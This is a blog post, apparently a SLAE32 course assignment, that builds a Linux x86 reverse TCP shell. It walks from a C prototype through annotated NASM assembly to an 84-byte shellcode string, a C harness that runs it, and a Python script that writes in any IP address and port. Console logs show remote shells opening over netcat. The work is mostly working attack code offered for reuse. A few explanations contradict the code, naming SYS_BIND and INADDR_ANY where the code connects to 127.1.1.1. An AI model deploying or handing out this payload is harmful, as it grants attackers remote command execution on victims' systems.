---
layout: single 
classes: wide
title:  "Shell Reverse TCP Shellcode"
date:   2020-03-10 10:11:06 +0800
categories: jekyll update
---

A reverse shell is a shell initiated from the target host back to the attacker host which is in a listening state to pick up the shell. 

## Requirements

- Create a Shell_Reverse_TCP shellcode
    - Reverse connects to configured IP and Port
    - Execs shell on successful connection
- IP and Port should be easily configurable

## Prototype

This prototype is more simple compare with Shell Bind TCP, it will connect to remote host `127.0.0.1` and port `8443`, once connected it will execute the shell `/bin/bash`. I tried to make the program as simple as possible without any error check. I've add lot of comments on the C code, hope it should be easy to understand.

{% highlight c linenos %}
#include<stdio.h>
#include<sys/socket.h>
#include<arpa/inet.h>

#define SHELL "/bin/bash"
#define REV_IP "127.0.0.1"
#define REV_PORT 8443

int main(int argc, char *argv[]) 
{
    int server_sock;
    struct sockaddr_in server_addr;

    // http://man7.org/linux/man-pages/man2/socket.2.html
    // Create the socket:
    // Address Family - AF_INET (IPv4)
    // Type - SOCK_STREAM (TCP protocol)
    // Protocol - 0 (IP protocol)
    server_sock = socket(AF_INET, SOCK_STREAM, 0);

    // Prepare the socketaddr_in structure
    server_addr.sin_family = AF_INET;
    inet_pton(AF_INET, REV_IP, &server_addr.sin_addr);
    server_addr.sin_port = htons(REV_PORT);

    // http://man7.org/linux/man-pages/man2/connect.2.html
    // initiate a connection on a socket
    connect(server_sock, (struct sockaddr *) &server_addr, sizeof(server_addr));

    // http://man7.org/linux/man-pages/man2/dup.2.html
    // Duplicate the file descriptors for stdin[0], stdout[1], stderr[2]
    //  to a newly created socket
    // This will redirect all input, output and error over 
    //  the socket, allowing interacting with the executed program
    dup2(server_sock, 0); 
    dup2(server_sock, 1);
    dup2(server_sock, 2);

    // http://man7.org/linux/man-pages/man2/execve.2.html
    // Execute the program SHELL /bin/bash
    execve(SHELL, NULL, NULL);

    return 0;
}
{% endhighlight %}

### Testing the prototype

After compiling C code, i ran the netcat which listening to port `8443` and then ran the application which immediately connect to the listening port by netcat from another terminal and able to get the shell. Also from the `strace` command output below i could trace the specified set of system calls used during the execution. And from here i could start for the assembly code.

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/reverse$ gcc reverse_shell.c -o reverse_shell
kecebong@ubuntu:~/slae32/assigment/reverse$
kecebong@ubuntu:~/slae32/assigment/reverse$ strace -e socket,connect,dup2,execve ./reverse_shell
execve("./reverse_shell", ["./reverse_shell"], [/* 19 vars */]) = 0
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
connect(3, {sa_family=AF_INET, sin_port=htons(8443), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
dup2(3, 0)                              = 0
dup2(3, 1)                              = 1
dup2(3, 2)                              = 2
execve("/bin/bash", [0], [/* 0 vars */]) = 0
socket(PF_FILE, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 4
connect(4, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
socket(PF_FILE, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 4
connect(4, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
--- SIGCHLD (Child exited) @ 0 (0) ---
--- SIGCHLD (Child exited) @ 0 (0) ---

────────────────────────────────────────────────────────────────────────────────────────────────────────
kecebong@ubuntu:~/slae32/assigment/reverse$ nc -lvn 8443
Connection from 127.0.0.1 port 8443 [tcp/*] accepted
id
uid=1000(kecebong) gid=1000(kecebong) groups=1000(kecebong),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),
108(lpadmin),109(sambashare)
ps
  PID TTY          TIME CMD
14282 pts/4    00:00:00 bash
14500 pts/4    00:00:00 strace
14501 pts/4    00:00:00 bash
14503 pts/4    00:00:00 ps
{% endhighlight %}

## Implementation

### 0. Initialization

The assembly code started with zeroing the registers, in this case `eax`, `ecx` and `edx`.

{% highlight nasm linenos %}
    ; zeroing the registers
    xor ecx, ecx    ; ecx = 0
    mul ecx         ; eax = 0
    cdq             ; xor edx, edx
{% endhighlight %}

### 1. Creating socket [ `socket` ]

The C code:
{% highlight c %}
server_sock = socket(AF_INET, SOCK_STREAM, 0);
{% endhighlight %}

To call the C equivalent of `socket()` on x86_32 (see notes section on `man 2 socketcall`), we need to use `socketcall` with the `SYS_SOCKET` argument. From the [man 2 socketcall](http://man7.org/linux/man-pages/man2/socketcall.2.html), the following is the format of the `socketcall` funtion.

{% highlight c %}
int socketcall(int call, unsigned long *args);
{% endhighlight %}

- `call` determines which socket function to invoke.
    - `SYS_SOCKET`
- `args` points to a block containing the actual arguments, which are passed through to the appropriate call.
    - `(int domain, int type, int protocol)`
        - domain = `AF_INET` # ipv4
        - type = `SOCK_STREAM` # tcp
        - protocol = 0 # tcp

Also the man page of [man 2 socket](http://man7.org/linux/man-pages/man2/socket.2.html), the following is the format of the `socket` function.
{% highlight c %}
int socket(int domain, int type, int protocol);
{% endhighlight %}

to get the syscall number on Ubuntu x86:

{% highlight console %}
# socketcall = 102 ~ 0x66
kecebong@ubuntu:~/slae32/assigment/bind$ grep socket /usr/include/i386-linux-gnu/asm/unistd_32.h
#define __NR_socketcall         102

# SYS_SOCKET = 1 ~ 0x01
kecebong@ubuntu:~/slae32/assigment/bind$ grep SYS_ /usr/include/linux/net.h
#define SYS_SOCKET      1               /* sys_socket(2)                */

# AF_INET = 2 ~ 0x02
kecebong@ubuntu:~/slae32/assigment/bind$ grep _INET /usr/include/i386-linux-gnu/bits/socket.h
#define PF_INET         2       /* IP protocol family.  */
#define AF_INET         PF_INET

# SOCK_STREAM = 1 ~ 0x01
kecebong@ubuntu:~/slae32/assigment/bind$ grep SOCK_STREAM /usr/include/i386-linux-gnu/bits/socket.h
SOCK_STREAM = 1,              /* Sequenced, reliable, connection-based
{% endhighlight %}

convert the decimal to hex:
{% highlight console %}
# convert to hex - socketcall = 102 ~ 0x66
kecebong@ubuntu:~/slae32/assigment/bind$ python -c 'print hex(102)'
0x66
{% endhighlight %}

so for this `socket` system call we need three registers:
- EAX : socketcall (0x66)
- EBX : SYS_SOCKET (0x01)
- ECX : (AF_INET, SOCK_STREAM, 0)
    - AF_INET : 0x02
    - SOCK_STREAM : 0x01
    - protocol : 0x00

and the following is the assembly code:

{% highlight nasm linenos %}
socket:
    ; create a socket
    ; server_sock = socket(AF_INET, SOCK_STREAM, 0);
    ; 
    ; eax : socketcall = 102 ~ 0x66
    ; ebx : SYS_SOCKET = 1 ~ 0x01
    ; ecx : args = esp (AF_INET = 0x02, SOCK_STREAM = 0x01, PROTOCOL = 0x00)
    ;
    push byte 0x66  ; syscall 
    pop eax          
    push byte 0x01  ; SYS_SOCKET
    pop ebx

    ; parameters for socket 
    ;
    ; (AF_INET, SOCK_STREAM, protocol)
    ; stack:
    ;   ecx => esp
    ;   0x02  - AF_INET
    ;   0x01  - SOCK_STREAM
    ;   0x00  - protocol
    push ecx        ; protocol    = 0 ~ 0x00
    push byte 0x01  ; SOCK_STREAM = 1 ~ 0x01
    push byte 0x02  ; AF_INET     = 2 ~ 0x02
    mov ecx, esp    ; args = pointing ecx to top of stack esp
    int 0x80        ; make a socket syscall

    ; store return sockfd on eax to edi
    ; that will be use for next instruction
    xchg edi, eax 
{% endhighlight %}

### 2. Initiate a connection on a socket [ `connect` ]

The C code:
{% highlight c %}
/* connect */
connect(server_sock, (struct sockaddr *) &server_addr, socklen_t addrlen);
{% endhighlight %}

The `connect()` system call connects the socket referred to by the file descriptor sockfd to the address specified by `addr`. The `addrlen` argument specifies the size of `addr`. The format of the address in `addr` is determined by the address space of the socket `sockfd`.

from the [man 2 connect](http://man7.org/linux/man-pages/man2/connect.2.html), the `connect` function format is 
{% highlight c %}
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
{% endhighlight %}

so for this `connect` system call we need three registers:
- EAX : `socketcall` (0x66)
- EBX : `SYS_BIND` (0x02)
- ECX : `(server_sock, (struct sockaddr *) &server_addr, socklen_t addrlen)`
    - `sockfd` : the socket fd returned from previous `socket` function
    - `struct sockaddr`: 
        - `sin_family` : `AF_INET` (0x01)
        - `sin_port`   : 8443 (convert to hex in network byte order 0xfb20)
        - `sin_addr`   : `INADDR_ANY` (bound to all local interfaces 0.0.0.0)
    - `socklen_t addrlen` : default is 16 (0x10)

and the following is the assembly code:

{% highlight nasm linenos %}
connect:
    ; initiate a connection on a socket
    ; socketcall
    push byte 0x66      ; socketcall = 102 ~ 0x66
    pop eax             ; eax = 0x66
    push byte 0x03      ; SYS_CONNECT = 3 ~ 0x03
    pop ebx             ; ebx = 0x03

    ;>>> "".join([ hex(int(y))[2:].zfill(2) for y in '127.1.1.1'.split('.')[::-1] ])
    ;'0101017f'
    ; struct sockaddr_in
    push 0x0101017f     ; 127.1.1.1
    push word 0xfb20    ; PORT 8443  ~ 0x20fb - in reverse network byte order 0xfb20
    push word 0x02      ; AF_INET = 2 ~ 0x02 
    mov ecx, esp        ; ecx pointing to top of stack esp  

    ; connect arg
    ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    push byte 0x10      ; sizeof sockaddr = 16 ~ 0x10
    push ecx            ; &server_addr
    push edi            ; sockfd
    mov ecx, esp        ; ecx pointing to top of stack esp  
    int 0x80

    xor ecx, ecx        ; zeroing ecx
    push byte 0x02
    pop ecx             ; ecx = 0x02

    push edi
    pop ebx
{% endhighlight %}

### 3. Duplicate file descriptors [ `dup2` ]

The `dup2` syscall is utilized to "clone" or duplicate file handles. If utilized in C or C++ the prototype is `int dup2 (int oldfilehandle, int newfilehandle)`. The `dup2` syscall clones the file handle `oldfilehandle` onto the file handle `newfilehandle`. Before executing the shell on the next command `execve` this is necessary to redirect `stdin`, `stdout` and `stderr` from the executed process to the network socket (client connection). from [man 2 dup2](http://man7.org/linux/man-pages/man2/dup.2.html), following is the format of `dup2` function.
{% highlight c %}
int dup2(int oldfd, int newfd);
{% endhighlight %}

In this case the `oldfd` is the socket fd from `socket` function, and the `newfd` are `stdin`, `stdout` and `stderr`.

to get the system call number on Ubuntu x86
{% highlight console %}
kecebong@ubuntu:~$ grep dup2  /usr/include/i386-linux-gnu/asm/unistd_32.h
#define __NR_dup2                63

kecebong@ubuntu:~/slae32/assigment/bind/asm$ python
>>> hex(63)
'0x3f'
{% endhighlight %}

and the following is the assembly code:

{% highlight nasm linenos %}
; dup2 arg new_sock
mov ebx, eax    ; save the new socket returned from `accept` function from ebx into eax

; for looping
; set ecx = 0x2 for counter 0-2
push byte 0x2
pop ecx

; Duplicate stdin/stdout/stderr to client socket
;
; dup2(new_sock, 0) - stdin
; dup2(new_sock, 1) - stdout
; dup2(new_sock, 2) - stderr
;
; al  = 0x3f
; ebx = client socket new_sock
; ecx = 0x2 => 2, 1, 0 - counter
dup2:
    mov al, 0x3f   ; dup2 = 63 ~ 0x3f
    int 0x80
    dec ecx
    jns dup2       ; continue to jump to dump2 label (loop) until the signed flag is set
{% endhighlight %}

### 4. Execute the shell [ `execve` ]

The first argument should be the program name; the second should be an array containing the program name and arguments. The last argument should be the environment data.

[man 2 execve](http://man7.org/linux/man-pages/man2/execve.2.html)

{% highlight c %}
int execve(const char *pathname, char *const argv[], char *const envp[]);
{% endhighlight %}

{% highlight c %}
execve(SHELL, NULL, NULL);
{% endhighlight %}

{% highlight console %}
kecebong@ubuntu:~$ grep execve /usr/include/i386-linux-gnu/asm/unistd_32.h
#define __NR_execve              11
{% endhighlight %}

{% highlight c linenos %}
    // http://man7.org/linux/man-pages/man2/execve.2.html
    // Execute the program SHELL /bin/bash
    execve(SHELL, NULL, NULL);
{% endhighlight %}

{% highlight nasm linenos %}
execve:
    ; execve
    push byte 0x0b          ; execve = 11 ~ 0x0b
    pop eax                 ; eax = 0x0b

    ; arg execve(SHELL, NULL, NULL);
    xor ecx, ecx            ; zeroing ecx
    push ecx                ; null
    push ecx                ; null
    push 0x68732f2f         ; "hs//""
    push 0x6e69622f         ; "nib/"
    mov ebx, esp            ; copy arguments on the stack to ecx
    int 0x80
{% endhighlight %}

## The Final Assembly Code

Putting all pieces together, this is the second assignment solution in assembler.

{% highlight nasm linenos %}
; reverse_tcp.nasm

global _start

section .text

_start:
    ; zeroing the registers
    xor ecx, ecx        ; ecx = 0
    mul ecx             ; eax = 0
    cdq                 ; xor edx, edx

socket:
    ; create a socket
    ; server_sock = socket(AF_INET, SOCK_STREAM, 0);
    ; 
    ; eax : socketcall = 102 ~ 0x66
    ; ebx : SYS_SOCKET = 1 ~ 0x01
    ; ecx : args = esp (AF_INET = 0x02, SOCK_STREAM = 0x01, PROTOCOL = 0x00)
    ;
    ; socketcall
    push byte 0x66      ; socketcall 102 ~ 0x66 
    pop eax             ; eax = 0x66
    push byte 0x01      ; SYS_SOCKET = 1
    pop ebx             ; ebx = 0x1

    ; parameters for socket 
    ;
    ; (AF_INET, SOCK_STREAM, protocol)
    ; stack:
    ;   ecx => esp
    ;   0x02  - AF_INET
    ;   0x01  - SOCK_STREAM
    ;   0x00  - protocol   
    ; socket args            
    push ecx            ; ecx = 0
    push byte 0x01      ; SOCK_STREAM = 0x01
    push byte 0x02      ; AF_INET = 0x02 
    mov ecx, esp        ; copy arguments on the stack to ecx
    int 0x80            ; return sockfd to eax

    ; store return sockfd on eax to edi
    ; that will be use for next instruction
    xchg edi, eax       ; store return sockfd on eax to edi

connect:
    ; initiate a connection on a socket
    ; socketcall
    push byte 0x66      ; socketcall = 102 ~ 0x66
    pop eax             ; eax = 0x66
    push byte 0x03      ; SYS_CONNECT = 3 ~ 0x03
    pop ebx             ; ebx = 0x03

    ;>>> "".join([ hex(int(y))[2:].zfill(2) for y in '127.1.1.1'.split('.')[::-1] ])
    ;'0101017f'
    ; struct sockaddr_in
    push 0x0101017f     ; 127.1.1.1
    push word 0xfb20    ; PORT 8443  ~ 0x20fb - in reverse network byte order 0xfb20
    push word 0x02      ; AF_INET = 2 ~ 0x02 
    mov ecx, esp        ; ecx pointing to top of stack esp  

    ; connect arg
    ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    push byte 0x10      ; sizeof sockaddr = 16 ~ 0x10
    push ecx            ; &server_addr
    push edi            ; sockfd
    mov ecx, esp        ; ecx pointing to top of stack esp  
    int 0x80

    xor ecx, ecx        ; zeroing ecx
    push byte 0x02
    pop ecx             ; ecx = 0x02

    push edi
    pop ebx

; Duplicate stdin/stdout/stderr to client socket
;
; dup2(new_sock, 0) - stdin
; dup2(new_sock, 1) - stdout
; dup2(new_sock, 2) - stderr
;
; al  = 0x3f
; ebx = client socket new_sock
; ecx = 0x2 => 2, 1, 0 - counter
dup2:
    ; dup2
    mov al, 0x3f        ; dup2 = 63 ~ 0x3f
    int 0x80
    dec ecx             ; 2, 1, 0
    jns dup2            ; continue to jump to dump2 label (loop) until the signed flag is set

; execve(SHELL, NULL, NULL);
execve:
    ; execve
    push byte 0x0b      ; execve = 11 ~ 0x0b
    pop eax             ; eax = 0x0b

    ; arg execve(SHELL, NULL, NULL);
    xor ecx, ecx        ; ecx = 0
    push ecx            ; null
    push ecx            ; null
    push 0x68732f2f     ; "hs//""
    push 0x6e69622f     ; "nib/"
    mov ebx, esp        ; copy arguments on the stack to ecx
    int 0x80
{% endhighlight %}

## Testing

Testing and run the shellcode, as we can see on the screenshot the shellcode is listening to `*` and port `8443` and i'm able to connect to the shell.

{% highlight console linenos %}
kecebong@ubuntu:~/slae32/assigment/reverse$ make clean-all
[*] Cleanup reverse_shell.*
rm -f reverse_shell.txt
rm -f reverse_shell.o
rm -f reverse_shell
[*] Cleanup shellcode.*
rm -f shellcode

kecebong@ubuntu:~/slae32/assigment/reverse$ make
[*] Assembling with nasm...
nasm -f elf32 -o reverse_shell.o reverse_shell.nasm

[*] Linking object...
ld -m elf_i386 -o reverse_shell reverse_shell.o

[*] Size of Shellcode:
   text	   data	    bss	    dec	    hex	filename
     84	      0	      0	     84	     54	reverse_shell

[*] Shellcode:
"\x31\xc9\xf7\xe1\x99\x6a\x66\x58\x6a\x01\x5b\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x97\x6a\x66
\x58\x6a\x03\x5b\x68\x7f\x01\x01\x01\x66\x68\x20\xfb\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89
\xe1\xcd\x80\x31\xc9\x6a\x02\x59\x57\x5b\xb0\x3f\xcd\x80\x49\x79\xf9\x6a\x0b\x58\x31\xc9\x51
\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

[*] Compiling shellcode...
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode

kecebong@ubuntu:~/slae32/assigment/reverse$ make run-shellcode
[*] Running shellcode...
./shellcode
Shellcode Length:  84

────────────────────────────────────────────────────────────────────────────────────────────────────────

kecebong@ubuntu:~/slae32/assigment/reverse$ nc -lvn 8443
Connection from 127.0.0.1 port 8443 [tcp/*] accepted
hostname
ubuntu
ps
  PID TTY          TIME CMD
 6286 pts/2    00:00:00 bash
 9678 pts/2    00:00:00 bash
12767 pts/2    00:00:00 make
12771 pts/2    00:00:00 sh
12774 pts/2    00:00:00 ps
exit
{% endhighlight %}

### Demo
![image](/assets/img/assigment2.gif)

## Port Customization

Above assembly code is using static ip address and port number, to make it more flexible and customize the ip address and port number, i've created the wrapper script that will replace the ip address and port number.

{% highlight python linenos %}
#!/usr/bin/env python

import sys

SHELLCODE=\
"\"\\x31\\xc9\\xf7\\xe1\\x99\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x51\\x6a\\x01\\x6a\\x02\\x89
\\xe1\\xcd\\x80\\x97\\x6a\\x66\\x58\\x6a\\x03\\x5b\\x68%s\\x66\\x68%s\\x66\\x6a\\x02\\x89
\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc9\\x6a\\x02\\x59\\x57\\x5b\\xb0\\x3f
\\xcd\\x80\\x49\\x79\\xf9\\x6a\\x0b\\x58\\x31\\xc9\\x51\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68
\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\""

if len(sys.argv) != 3:
  print("[-1] ERROR: Enter the ip address and port number")
  exit()

ip=sys.argv[1]
port=sys.argv[2]

if (len(ip.split('.')) != 4):
    print("\n[-] ERROR: IP Address is incorrect!\n")
    exit()

if ((int(port) > 65535) or (int(port) < 256)):
    print("\n[-] ERROR: Port number must be between 256 and 65535\n")
    exit()

# ip
hexip = "".join([ hex(int(y))[2:].zfill(2) for y in ip.split('.') ])
hexipsh = "".join([ "\\x" + hex(int(y))[2:].zfill(2) for y in ip.split('.') ])

# port
hexport = hex(int(port)).replace('0x','')
if len(hexport)<4:
    hexport = '0'+hexport

if '00' in hexport[:2] or '00' in hexport[2:4] or '00' in ip:
    print "[-] FAILED: ip address or port number null bytes found!"
    sys.exit(1)

print("Port: %s"% port)
print("Hex Port: %s"% hexport)
print("IP Address: %s"% ip)
print("Hex IP Address: %s"% hexip)
print("\nShellcode:")
print(SHELLCODE%(hexipsh, "\\x" + str(hexport[:2]) + "\\x" + str(hexport[2:4])))
print("\n")
{% endhighlight %}

## Testing
{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/reverse$ ./gen_reverse_tcp.py 192.168.112.128 8888
Port: 8888
Hex Port: 22b8
IP Address: 192.168.112.128
Hex IP Address: c0a87080

Shellcode:
"\x31\xc9\xf7\xe1\x99\x6a\x66\x58\x6a\x01\x5b\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x97\x6a\x66
\x58\x6a\x03\x5b\x68\xc0\xa8\x70\x80\x66\x68\x22\xb8\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89
\xe1\xcd\x80\x31\xc9\x6a\x02\x59\x57\x5b\xb0\x3f\xcd\x80\x49\x79\xf9\x6a\x0b\x58\x31\xc9\x51
\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

kecebong@ubuntu:~/slae32/assigment/reverse$ cat test.c 
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc9\xf7\xe1\x99\x6a\x66\x58\x6a\x01\x5b\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x97\x6a\x66
\x58\x6a\x03\x5b\x68\xc0\xa8\x70\x80\x66\x68\x22\xb8\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89
\xe1\xcd\x80\x31\xc9\x6a\x02\x59\x57\x5b\xb0\x3f\xcd\x80\x49\x79\xf9\x6a\x0b\x58\x31\xc9\x51
\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

main()
{
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}

kecebong@ubuntu:~/slae32/assigment/reverse$ gcc -fno-stack-protector -z execstack test.c -o test

kecebong@ubuntu:~/slae32/assigment/reverse$ ./test 
Shellcode Length:  84

────────────────────────────────────────────────────────────────────────────────────────────────────────
kecebong@ubuntu:~/slae32/assigment$ nc -lvn 8888
Connection from 192.168.112.128 port 8888 [tcp/*] accepted
uptime
 00:54:45 up 1 day,  8:04,  1 user,  load average: 0.00, 0.02, 0.05
whoami
kecebong
ps
  PID TTY          TIME CMD
12212 pts/1    00:00:00 bash
12799 pts/1    00:00:00 sh
12802 pts/1    00:00:00 ps
exit

{% endhighlight %}

## Demo
![image](/assets/img/assigment2_1.gif)

{% include_relative slae32.html %}